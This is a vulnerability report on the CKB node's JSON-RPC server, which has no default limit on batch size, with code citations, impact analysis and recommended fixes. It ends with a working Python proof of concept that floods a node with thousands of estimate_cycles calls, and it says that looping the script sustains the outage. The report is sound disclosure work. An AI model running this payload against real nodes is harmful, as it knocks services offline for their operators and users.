### Title
Unbounded JSON-RPC Batch Request Size Enables CPU Exhaustion DoS - (`rpc/src/server.rs`)

### Summary
The CKB node's JSON-RPC server processes batch requests without any default upper bound on the number of calls per batch. The `rpc_batch_limit` guard is only active when explicitly configured; it is commented out in the shipped default config. A local RPC caller (explicitly in scope) can submit a single HTTP POST containing tens of thousands of expensive method calls — most critically `estimate_cycles`, which runs full script verification — causing sustained CPU exhaustion and node unresponsiveness. This is the direct CKB analog of the Ditto `shortHintArray` finding: an attacker-controlled array is iterated without a length check, and the node pays the full resource cost.

### Finding Description

**Root cause — missing default bound on batch size**

`rpc/src/server.rs` initializes the batch limit only when the operator has explicitly set `rpc_batch_limit` in the config:

```rust
static JSONRPC_BATCH_LIMIT: OnceLock<usize> = OnceLock::new();

pub fn new(config: RpcConfig, ...) -> Self {
    if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
        let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
    }
    ...
}
``` [1](#0-0) 

In the request handler, the guard is only evaluated when the `OnceLock` has been populated:

```rust
Request::Batch(calls) => {
    if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
        && calls.len() > *batch_size
    {
        return make_error_response(...);
    }
    // ALL calls are processed unconditionally when limit is None
    let stream = stream::iter(calls)
        .then(move |call| { ... io.handle_call(call, ...).await })
        ...
}
``` [2](#0-1) 

Because the shipped default config leaves `rpc_batch_limit` commented out, `JSONRPC_BATCH_LIMIT.get()` always returns `None`, the `if let Some(...)` branch is never taken, and every call in the batch is executed unconditionally:

```toml
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
``` [3](#0-2) 

**Attacker-controlled entry path**

The only bound on the batch is the HTTP body size limit (`max_request_body_size = 10 485 760`, i.e. 10 MiB). Within that 10 MiB the attacker controls the number and type of calls.

The most damaging call is `estimate_cycles`, which is enabled by default in the `Chain` module and runs full RISC-V script verification on the supplied transaction:

```rust
fn estimate_cycles(&self, tx: Transaction) -> Result<EstimateCycles> {
    let tx: packed::Transaction = tx.into();
    CyclesEstimator::new(&self.shared).run(tx)
}
``` [4](#0-3) 

A minimal `estimate_cycles` JSON payload is ≈ 200 bytes. Within a 10 MiB batch body an attacker can embed ≈ 50 000 such calls. Each call is permitted to consume up to `max_tx_verify_cycles = 70 000 000` VM cycles. The calls are dispatched sequentially inside the async stream, monopolising the Tokio worker thread for the duration.

**Structural parallel to the Ditto `shortHintArray` bug**

| Ditto | CKB |
|---|---|
| `shortHintArray` — attacker-controlled `uint16[]` | Batch `calls` — attacker-controlled `Vec<Call>` |
| No length check before looping | `JSONRPC_BATCH_LIMIT` is `None` by default; check never fires |
| TAPP pays gas for every iteration | Node CPU pays for every `estimate_cycles` execution |
| TAPP drained → market shutdown | Node CPU saturated → RPC/sync unresponsive |

### Impact Explanation

A local RPC caller (the scope explicitly lists "supported local CLI/RPC user" as a valid attacker) can send one HTTP POST to `127.0.0.1:8114` containing a batch of ≈ 50 000 `estimate_cycles` calls. The node's async runtime processes all calls sequentially, saturating CPU for an extended period. During this time:

- The RPC server is unresponsive to legitimate requests (block submission, `send_transaction`, miner `get_block_template`).
- The sync and relay protocol handlers share the same Tokio runtime and are starved.
- Mining revenue is interrupted; pending transactions are not relayed.

This constitutes **severe service degradation** under realistic attacker input, matching the impact category in `RESEARCHER.md`.

### Likelihood Explanation

- The default config ships with `rpc_batch_limit` commented out; no operator action is required to be vulnerable.
- The `Chain` module (which exposes `estimate_cycles`) is enabled by default.
- Any process with local network access to port 8114 — including any user-level process on the same host — can trigger the condition with a single HTTP request.
- No authentication, no key, no privileged role is required beyond local network reachability.

### Recommendation

1. **Set a hard default** for `rpc_batch_limit` in `RpcConfig` (e.g. 100) so that `JSONRPC_BATCH_LIMIT` is always populated, regardless of operator configuration.
2. Alternatively, reject batch requests entirely when `rpc_batch_limit` is absent, rather than silently allowing unlimited batches.
3. Document the security implication of leaving `rpc_batch_limit` unset.

### Proof of Concept

```python
import json, requests

# Build a batch of 5000 estimate_cycles calls, each with a minimal transaction
call = {
    "jsonrpc": "2.0", "method": "estimate_cycles", "id": 1,
    "params": [{
        "version": "0x0", "cell_deps": [], "header_deps": [],
        "inputs": [{"previous_output": {"tx_hash": "0x" + "00"*32, "index": "0x0"}, "since": "0x0"}],
        "outputs": [{"capacity": "0x174876e800",
                     "lock": {"code_hash": "0x" + "00"*32, "hash_type": "data", "args": "0x"},
                     "type_": None}],
        "outputs_data": ["0x"], "witnesses": []
    }]
}
batch = [call] * 5000   # well within 10 MiB; increase for stronger effect

# Single HTTP POST — no authentication required
r = requests.post("http://127.0.0.1:8114", json=batch)
# Node CPU is saturated for the duration of processing all 5000 calls
print(r.status_code, len(r.json()))
```

The node's RPC and sync threads are unresponsive for the duration of the batch execution. Repeating the request in a loop sustains the denial of service indefinitely.

### Citations

**File:** rpc/src/server.rs (L34-55)
```rust
static JSONRPC_BATCH_LIMIT: OnceLock<usize> = OnceLock::new();

#[doc(hidden)]
#[derive(Debug)]
pub struct RpcServer {
    pub http_address: SocketAddr,
    pub tcp_address: Option<SocketAddr>,
    pub ws_address: Option<SocketAddr>,
}

impl RpcServer {
    /// Creates an RPC server.
    ///
    /// ## Parameters
    ///
    /// * `config` - RPC config options.
    /// * `io_handler` - RPC methods handler. See [ServiceBuilder](../service_builder/struct.ServiceBuilder.html).
    /// * `handler` - Tokio runtime handle.
    pub fn new(config: RpcConfig, io_handler: IoHandler, handler: Handle) -> Self {
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L274-296)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }

                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** rpc/src/module/chain.rs (L2119-2122)
```rust
    fn estimate_cycles(&self, tx: Transaction) -> Result<EstimateCycles> {
        let tx: packed::Transaction = tx.into();
        CyclesEstimator::new(&self.shared).run(tx)
    }
```
